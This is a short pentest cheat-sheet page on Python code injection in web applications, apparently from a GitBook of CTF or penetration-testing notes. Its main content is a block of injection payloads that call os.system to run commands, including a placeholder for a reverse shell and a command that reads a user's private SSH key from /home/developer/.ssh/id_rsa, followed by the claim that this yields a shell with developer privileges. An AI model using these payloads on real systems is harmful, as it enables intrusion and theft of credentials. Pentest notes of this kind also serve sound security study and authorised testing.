# Python Code Injection

{% embed url="https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html" %}

Suppose that you have the following command.&#x20;

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

You may be able to insert the following payloads.&#x20;

```bash
# Code execution
__import__('os').system('id')
__import__('os').system('reverse shell command,etc...')
# or sensitve information leakage
__import__('os').system('cat /home/developer/.ssh/id_rsa')
```

Running this shell with the code execution, you could get a shell with a developer privilege.&#x20;
